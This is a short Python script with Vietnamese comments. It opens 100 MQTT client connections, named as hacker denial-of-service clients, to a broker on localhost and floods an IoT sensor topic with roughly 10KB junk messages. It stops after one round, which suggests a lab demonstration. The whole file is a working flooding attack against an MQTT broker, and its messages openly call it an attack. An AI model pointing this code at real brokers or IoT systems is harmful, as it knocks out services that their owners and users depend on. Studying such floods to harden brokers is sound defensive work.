import paho.mqtt.client as mqtt
import time

BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "iot/home/sensor1"

# Tạo một gói tin rác khá nặng (khoảng 10KB/tin nhắn)
RBB_PAYLOAD = "RÁC " * 2500 

clients = []

print("Đang tạo đội quân 100 Hacker kết nối...")
for i in range(100):
    c = mqtt.Client(f"Hacker_DoS_{i}")
    try:
        c.connect(BROKER, PORT)
        c.loop_start() # Bắt đầu luồng ngầm quản lý kết nối
        clients.append(c)
    except:
        pass

print(f"Bắt đầu Spam dữ liệu bằng {len(clients)} kết nối!")
try:
    while True:
        # Xả đạn liên tục từ tất cả các client
        for c in clients:
            c.publish(TOPIC, RBB_PAYLOAD, qos=0)
        time.sleep(3) # Tạm dừng 3s giữa các lượt gửi để tránh quá tải CPU
        exit(0) # Thoát sau 1 lượt gửi để tránh tấn công quá lâu
        
except KeyboardInterrupt:
    print("Dừng tấn công.")